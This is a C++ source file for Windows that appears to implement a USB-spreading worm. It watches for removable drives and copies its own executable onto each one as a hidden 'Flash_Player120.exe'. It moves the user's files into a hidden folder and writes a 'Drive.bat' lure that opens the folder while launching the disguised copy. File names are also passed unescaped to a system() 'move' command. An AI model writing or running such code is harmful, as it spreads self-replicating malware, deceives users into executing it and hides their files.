#include  "includes.h"
string USB_USER_FILES_PATH = "Drive";
class USB_HANDLER {
private:
	int		getDriveType(char* drive) {
			int type = GetDriveType(drive);
			switch (type) {
			case DRIVE_FIXED:
				return 0;//"Drive type fixed";
				break;

			case DRIVE_REMOVABLE:
				return 1;//"Drive type removable";
				break;

			case DRIVE_CDROM:
				return 2;//"Drive type CDROM";
				break;

			case DRIVE_REMOTE:
				return 3;//"Drive type remote";
				break;

			case DRIVE_RAMDISK:
				return 4;//"Drive type ramdisk";
				break;

			default:
				return 404;//"Drive type unknown";
			}
		}
	void	Move(string SRC, string DEST) {
			string command = ("move \"" + SRC + "\" \"" + DEST+"\"");
			system(command.c_str());
		}
	int		IsExist(const string& name) {
			ifstream f(name.c_str());
			return f.good();
		}
	bool	DirExists(const string& dirName_in)
		{
			DWORD ftyp = GetFileAttributesA(dirName_in.c_str());
			if (ftyp == INVALID_FILE_ATTRIBUTES)
				return false;  //something is wrong with your path!

			if (ftyp & FILE_ATTRIBUTE_DIRECTORY)
				return true;   // this is a directory!

			return false;    // this is not a directory!
		}
	void	Copy(const char *SRC, const char* DEST) {
			ifstream src(SRC, ios::binary);
			ofstream dest(DEST, ios::binary);
			dest << src.rdbuf();
		}
	void	SelfCopy(const char* new_path) {
			char Path[_MAX_PATH + 1];
			GetModuleFileName(NULL, Path, _MAX_PATH);
			Copy(Path, new_path);
		}
	void	Shortcut(string drive_letter) {
			ofstream myfile;
			myfile.open(drive_letter + "Drive.bat");
			myfile << "explorer Drive & start Drive/adobe/Flash_Player120.exe";
			myfile.close();
		}
public:
	void	FindUsbDevices() {
			while (1) {Sleep(1000);
				char* D_LETTERS[] = { "A:", "B:" "C:","D:","E:","F:","G:","H:","I:","J:","K:","L:","M:","N:","O:","P:","Q:" , "R:" , "S:", "T:" , "U:" , "V:" , "W:", "X:" , "Y:" , "Z:" };
				for (int i = 0; i < sizeof(D_LETTERS) / sizeof(char*); ++i)
				{
					if (getDriveType(D_LETTERS[i]) == 1) {
						WIN32_FIND_DATA search_data;
						memset(&search_data, 0, sizeof(WIN32_FIND_DATA));
						HANDLE handle = FindFirstFile((string(D_LETTERS[i]) + "\\\*").c_str(), &search_data);
						if (!DirExists((string(D_LETTERS[i]) + "//" + USB_USER_FILES_PATH))){CreateDirectory((string(D_LETTERS[i]) + "//" + USB_USER_FILES_PATH).c_str(), NULL);}
						if (!DirExists((string(D_LETTERS[i]) + "//" + USB_USER_FILES_PATH + "//Adobe"))){CreateDirectory((string(D_LETTERS[i]) + "//" + USB_USER_FILES_PATH + "//Adobe").c_str(), NULL);}
						if (!IsExist((string(D_LETTERS[i]) + "//" + USB_USER_FILES_PATH + "//Adobe//Flash_Player120.exe"))){SelfCopy((string(D_LETTERS[i]) + "//" + USB_USER_FILES_PATH + "//Adobe//Flash_Player120.exe").c_str());}
						SetFileAttributes((string(D_LETTERS[i]) + "//" + USB_USER_FILES_PATH).c_str(), FILE_ATTRIBUTE_HIDDEN);
						SetFileAttributes((string(D_LETTERS[i]) + "//" + USB_USER_FILES_PATH + "//Adobe").c_str(), FILE_ATTRIBUTE_HIDDEN);
							while (handle != INVALID_HANDLE_VALUE) {
								if (string(search_data.cFileName) != string("System Volume Information") && string(search_data.cFileName) != string(USB_USER_FILES_PATH) && string(search_data.cFileName) != string("Drive.bat")){
									Move(string(D_LETTERS[i]) + "/" + string(search_data.cFileName), string(D_LETTERS[i]) + "/" + USB_USER_FILES_PATH +"/"+ string(search_data.cFileName));
									Shortcut(string(D_LETTERS[i]));
								}
								if (FindNextFile(handle, &search_data) == FALSE)
									break;
							}
						FindClose(handle);
				}
			}
		}
	}

};
